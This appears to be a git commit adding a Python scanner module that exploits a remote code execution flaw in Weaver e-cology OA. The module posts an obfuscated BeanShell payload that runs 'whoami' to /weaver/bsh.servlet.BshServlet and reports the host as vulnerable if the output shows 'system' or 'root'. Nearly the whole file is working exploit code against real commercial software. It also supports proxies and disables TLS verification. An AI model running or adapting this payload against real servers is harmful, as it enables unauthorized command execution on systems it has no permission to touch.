f2e63a5337dd88b3ea79d71d8bed0844d7f4b8c0
Ascotbe <869335729@qq.com>
2019-09-27 06:44:08 +0800

    v0.21.3:green_apple:

---
+++ OA/Weaver/Weaver_CommandExecution.py
@@ -0,0 +1,53 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import urllib
+import requests
+
+def UrlProcessing(url):
+    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
+        res = urllib.parse.urlparse(url)
+    else:
+        res = urllib.parse.urlparse('http://%s' % url)
+    return res.scheme, res.hostname, res.port
+
+
+payload= '/weaver/bsh.servlet.BshServlet'
+post_data = 'bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
+def medusa(Url,RandomAgent,ProxyIp):
+
+    scheme, url, port = UrlProcessing(Url)
+    if port is None and scheme == 'https':
+        port = 443
+    elif port is None and scheme == 'http':
+        port = 80
+    else:
+        port = port
+    global resp
+    global resp2
+    try:
+        payload_url = scheme+"://"+url+payload
+        headers = {
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept': '*/*',
+            "Referer": payload_url,
+            "Cookie": "JSESSIONID=abcT_7z-8zGPy7QoU_n1w; testBanCookie=test",
+            "Content-Type": "application/x-www-form-urlencoded",
+            'User-Agent': RandomAgent,
+        }
+        #s = requests.session()
+        if ProxyIp!=None:
+            proxies = {
+                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+                "http": "http://" + str(ProxyIp)
+            }
+            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=10, verify=False)
+        elif ProxyIp==None:
+            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=10, verify=False)
+        con = resp.content
+        code = resp.status_code
+        if code==200 and (con.lower().find('system')!=-1 or con.lower().find('root')!=-1):
+            Medusa = "{} 存在泛微e-cology OA系统远程代码执行漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
+            return (Medusa)
+    except Exception as e:
+        pass
